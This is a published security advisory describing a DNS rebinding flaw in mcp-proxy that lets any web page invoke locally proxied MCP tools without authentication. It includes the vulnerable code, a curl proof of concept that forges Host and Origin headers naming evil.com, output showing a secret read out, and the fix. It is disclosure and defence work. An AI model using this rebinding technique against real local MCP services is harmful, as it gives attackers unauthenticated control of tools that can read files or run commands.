---
title: "Missing Host Validation in mcp-proxy"
date: 2026-11-02
target: "sparfenyuk/mcp-proxy"
severity: High
identifier: "GHSA-8grc-q47q-7v3r"
advisory_url: "https://github.com/sparfenyuk/mcp-proxy/security/advisories/GHSA-8grc-q47q-7v3r"
summary: "mcp-proxy exposes a local stdio MCP server over an HTTP endpoint but never validated the inbound Host or Origin header, so any web page the operator visited could reach the proxied tools through DNS rebinding and drive a full MCP session against them with no authentication."
---

## Summary

`mcp-proxy` bridges a local stdio MCP server to network clients by serving it over an HTTP endpoint. In every release from 0.3.0 up to 0.13.3 that endpoint accepted requests without ever checking the inbound `Host` or `Origin` header. Because the proxy binds to loopback by default and carries no authentication on the routes it serves, any web page the operator visited while `mcp-proxy` was running could reach the proxied tools through DNS rebinding and invoke them. The fix in 0.13.3 validates the authority of each request before it is routed. The advisory is [GHSA-8grc-q47q-7v3r](https://github.com/sparfenyuk/mcp-proxy/security/advisories/GHSA-8grc-q47q-7v3r), rated High (CVSS 8.0).

## Background

The Model Context Protocol lets a client drive tools exposed by a server. Many MCP servers speak over stdio: the client launches the server as a child process and talks to it over standard input and output. `mcp-proxy` exists to put such a server on the network. You hand it a local command, and it runs that command as a stdio MCP server while exposing it over HTTP so a remote or browser based MCP client can use it. Its primary documented use is taking a stdio server configured for a desktop MCP client and making it reachable over the network.

The HTTP side builds on the MCP Python SDK. That SDK ships a transport security layer that can validate the `Host` and `Origin` of inbound requests, which is the defense a loopback service needs against DNS rebinding. The layer is opt in. If a server author does not construct it with explicit settings, the SDK disables rebinding protection, stated in its own code as a backwards compatibility default.

## The vulnerability

`mcp-proxy` constructed its SSE transport without passing any security settings:

```python
sse_transport = SseServerTransport("/messages/")
```

With no settings supplied, the SDK took the insecure path:

```python
def __init__(self, settings: TransportSecuritySettings | None = None):
    # If not specified, disable DNS rebinding protection by default
    # for backwards compatibility
    self.settings = settings or TransportSecuritySettings(enable_dns_rebinding_protection=False)
```

Nothing else in the project filled the gap. There was no trusted host middleware anywhere. CORS was only attached when the operator passed an explicit allow origin flag, which defaulted to empty, and CORS would not have stopped this attack in any case, since DNS rebinding is designed to defeat same origin checks that key on hostname. The inbound routes had no authentication of their own. The default bind address was `127.0.0.1`, which is exactly the setting rebinding targets: a service assumed safe because it is not reachable from outside the machine. The same gap applied to the Streamable HTTP transport the proxy also served.

The result is that every request to the SSE and messages routes was accepted no matter what `Host` or `Origin` it carried.

## Proof of concept

The victim runs `mcp-proxy` the documented way, wrapping a local stdio server. The stand in below returns a value that only a local caller should ever see:

```python
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("victim-stdio-server")

@mcp.tool()
def get_secret() -> str:
    """Return a secret value that only a local, trusted caller should see."""
    return "TOP-SECRET-LOCAL-VALUE-4f9a"

if __name__ == "__main__":
    mcp.run(transport="stdio")
```

```bash
mcp-proxy --port 18099 --host 127.0.0.1 -- python3 victim_server.py
```

A browser cannot be told to forge a `Host` header, but DNS rebinding does it for the attacker: the page is served from `evil.com`, its hostname is rebound to `127.0.0.1`, and the browser keeps sending `Host: evil.com` and `Origin: http://evil.com` on the connection that now lands on the local proxy. The single request below reproduces exactly what the browser emits:

```bash
curl -i -N -H "Host: evil.com" -H "Origin: http://evil.com" http://127.0.0.1:18099/sse
```

```
HTTP/1.1 200 OK
content-type: text/event-stream; charset=utf-8

event: endpoint
data: /messages/?session_id=28ff5faea55040aaab7c5fa1aa2f158c
```

The forged request is handed a live session. Driving the rest of the MCP protocol over that session, still with the forged headers, completes `initialize` and then `tools/call` and returns the tool output:

```
[sse event] {"jsonrpc":"2.0","id":2,"result":{"content":[{"type":"text","text":"TOP-SECRET-LOCAL-VALUE-4f9a"}],"structuredContent":{"result":"TOP-SECRET-LOCAL-VALUE-4f9a"},"isError":false}}
```

That the missing settings object is the sole cause is easy to show. Rebuilding the one transport with explicit allowed hosts and origins:

```python
sse_transport = SseServerTransport(
    "/messages/",
    security_settings=TransportSecuritySettings(
        allowed_hosts=["127.0.0.1:18100"],
        allowed_origins=["http://127.0.0.1:18100"],
    ),
)
```

leaves the legitimate loopback request working while the identical forged request is now rejected:

```
$ curl -i -N -H "Host: evil.com" -H "Origin: http://evil.com" http://127.0.0.1:18100/sse
HTTP/1.1 421 Misdirected Request

Invalid Host header
```

The SDK protection works fully once it is switched on.

## Impact

Anyone running `mcp-proxy` to expose a local stdio server, its main use, could have the proxied tools invoked without authentication by a remote attacker. The only interaction required is the operator visiting an attacker controlled page while the proxy is running, and the proxy port never needs to be reachable from outside loopback. What the attacker gains depends on the wrapped server. The demo proves confidentiality by reading a tool result, but the primitive is unauthenticated invocation of any tool the server exposes, with attacker chosen arguments. A filesystem, shell, git, or credential server behind the proxy turns that into file read and write or command execution. The published advisory scores it High at CVSS 8.0.

## The fix

Release 0.13.3 adds an authority check that runs before a request is routed, its body is read, a session is created, or anything is forwarded to the backend. It validates `Host` and `Origin`, rejects duplicate or malformed authority headers, and keeps the host check active even when wildcard origins are allowed. A wildcard bind now requires the operator to name the trusted hosts explicitly, for example with `--allowed-host mcp.example.com:8080`. The maintainer notes that these checks guard the browser mediated path and do not authenticate native clients, so a public or shared deployment still belongs behind an authenticated reverse proxy or network controls.

## Timeline

- 2026-09-12: Reported to the maintainer.
- 2026-11-02: Fixed in 0.13.3 and advisory published.

## Disclosure

Public advisory: [GHSA-8grc-q47q-7v3r](https://github.com/sparfenyuk/mcp-proxy/security/advisories/GHSA-8grc-q47q-7v3r).
